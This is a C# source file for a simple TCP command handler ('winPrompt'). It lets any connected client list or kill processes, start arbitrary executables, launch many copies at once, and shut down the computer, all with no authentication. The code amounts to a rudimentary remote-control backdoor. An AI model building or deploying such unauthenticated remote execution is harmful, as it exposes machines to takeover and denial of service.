using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace winPrompt
{ 
    class ClientHandler
    {
        NetworkStream stream;
        public ClientHandler(TcpClient client)
        {
            stream = client.GetStream();
            SendNewLineMessageToClient("Connected !");
            SendNewLineMessageToClient("Enter a command :");
            while (true)
            {
                Thread.Sleep(5000);
                string input = ReadFromClient(1024);
                Task.Factory.StartNew(() =>
                {
                    HandlerCommand(input.Split('\n')[0].Split(','));
                });
            }
        }

        public void HandlerCommand(string[] input)
        {
            switch (input[0])
            {
                case "help":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    SendNewLineMessageToClient("Here is a list of commands you can run here :");
                    SendNewLineMessageToClient("help   - Shows this");
                    SendNewLineMessageToClient("mbshow - Displays a MessageBox");
                    SendNewLineMessageToClient("    <Message> - Message to display");
                    SendNewLineMessageToClient("        <Title> - Title of the windows");
                    SendNewLineMessageToClient("lproc  - Lists runing processes");
                    SendNewLineMessageToClient("kproc  - Kills all processes");
                    SendNewLineMessageToClient("    <Name> - Specifies the name");
                    SendNewLineMessageToClient("rproc  - Starts a new process");
                    SendNewLineMessageToClient("    <Executable> - Specifies the name of the executable to run");
                    SendNewLineMessageToClient("        <args> - Specifies the program's arguments");
                    SendNewLineMessageToClient("mrproc - Starts multiple new processes");
                    SendNewLineMessageToClient("    <Multiplier> - Number of process started");
                    SendNewLineMessageToClient("        <Executable> - Specifies the name of the executable to run");
                    SendNewLineMessageToClient("            <args> - Specifies the program's arguments");
                    SendNewLineMessageToClient("shutdown  - Shutdown your computer");
                    break;
                case "mbshow":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    SendNewLineMessageToClient("No implement this command now");
                    break;
                case "lproc":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    SendNewLineMessageToClient("Hrer is a list of all running processes : ");
                    Process[] procs = Process.GetProcesses();
                    foreach (Process p in procs)
                    {
                        SendNewLineMessageToClient(p.ProcessName);
                    }
                    break;
                case "kproc":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    Process[] ps = Process.GetProcesses();
                    foreach (Process p in ps)
                    {
                        if (p.ProcessName == input[1])
                        {
                            p.Kill();
                            SendNewLineMessageToClient("Killed : " + p.ProcessName);
                        }
                    }
                    break;
                case "rproc":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    Process.Start(input[1], input[2]);
                    break;
                case "mrproc":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    for (int i = 0; i < Int32.Parse(input[1]); i++)
                        Process.Start(input[2], input[3]);
                    break;
                case "shutdown":
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    SendNewLineMessageToClient("Start to shutdown now");
                    var process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c shutdown/s";
                    process.Start();
                    break;
                default:
                    // On descend a la ligne
                    SendNewLineMessageToClient("");
                    SendNewLineMessageToClient("Invalid command");
                    break;
            }
        }

        private void SendInLineMessageToClient(string message)
        {
            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
            stream.Write(msg, 0, msg.Length);
        }

        private void SendNewLineMessageToClient(string message)
        {
            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message + Environment.NewLine);
            stream.Write(msg, 0, msg.Length);
        }

        private string ReadFromClient(int bufferSize)
        {
            int i;
            string data = "";
            byte[] bytes = new byte[bufferSize];
            if ((i = stream.Read(bytes, 0, bufferSize)) != 0)
                data = Encoding.ASCII.GetString(bytes, 0, i);

            return data;
        }
    }
}
